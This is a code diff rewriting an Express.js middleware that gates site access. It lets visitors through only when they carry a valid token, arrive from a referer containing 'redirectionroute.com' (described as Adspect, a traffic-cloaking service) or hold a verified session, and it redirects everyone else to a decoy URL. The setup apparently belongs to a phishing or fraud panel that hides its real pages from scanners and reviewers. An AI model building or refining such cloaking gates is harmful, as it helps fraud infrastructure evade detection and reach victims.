@@ -300,49 +300,7 @@ const generateSessionId = (clientIP, userAgent) => {
         .slice(0, 8);
 };
 
-const validateToken = (req, res, next) => {
-    // List of paths that should skip token validation
-    const skipPaths = [
-        '/admin',
-        '/admin/',
-        '/generate-token',
-        '/socket.io',
-        '/js/',
-        '/css/',
-        '/images/',
-        '/verify-turnstile'
-    ];
 
-    // Skip validation for admin routes and static assets
-    if (skipPaths.some(path => req.path.startsWith(path)) || 
-        req.path.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg)$/)) {
-        return next();
-    }
-
-    // Special handling for root path when it's an admin panel
-    if (req.path === '/' && req.headers.referer?.includes('/admin')) {
-        return next();
-    }
-
-    // Check if the request is coming from Adspect or has a valid token
-    const token = req.query.token;
-    const referer = req.headers.referer;
-    const isFromAdspect = referer && referer.includes('redirectionroute.com');
-    const isValidToken = token && tokenManager.isValidToken(token);
-
-    if (!isFromAdspect && !isValidToken) {
-        console.log('Token validation failed:', { 
-            path: req.path,
-            token, 
-            referer,
-            isFromAdspect,
-            isValidToken 
-        });
-        return res.redirect(state.settings.redirectUrl);
-    }
-
-    next();
-};
 
 
 // Initialize server components
@@ -354,6 +312,59 @@ app.use(cookieParser());
 secureServer(app);
 
 
+const validateToken = (req, res, next) => {
+    // Paths that should always skip token validation
+    const skipPaths = [
+        '/admin',
+        '/generate-token',
+        '/socket.io',
+        '/js/',
+        '/css/',
+        '/images/',
+        '/verify-turnstile'
+    ];
+
+    // Skip validation for excluded paths and static assets
+    if (skipPaths.some(path => req.path.startsWith(path)) || 
+        req.path.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg)$/)) {
+        return next();
+    }
+
+    // Special case for root path - redirect to Adspect
+    if (req.path === '/') {
+        if (req.headers.referer?.includes('/admin')) {
+            return next();
+        }
+        return res.redirect('https://redirectionroute.com/');
+    }
+
+    // Special case for /check-ip - validate token but don't redirect
+    if (req.path === '/check-ip') {
+        const token = req.query.token;
+        const referer = req.headers.referer;
+        const isFromAdspect = referer && referer.includes('redirectionroute.com');
+        const isValidToken = token && tokenManager.isValidToken(token);
+
+        if (!isFromAdspect && !isValidToken) {
+            console.log('Token validation failed for /check-ip:', { token, referer });
+            return res.redirect(state.settings.redirectUrl);
+        }
+        return next();
+    }
+
+    // For all other paths, require a valid session
+    const clientId = new URLSearchParams(req.url.split('?')[1] || '').get('client_id');
+    const session = sessionManager.getSession(clientId);
+
+    if (!session || !session.verified) {
+        console.log('Invalid session access:', { path: req.path, clientId });
+        return res.redirect('/');
+    }
+
+    next();
+};
+
+// Apply token validation
 app.use(validateToken);
 
 
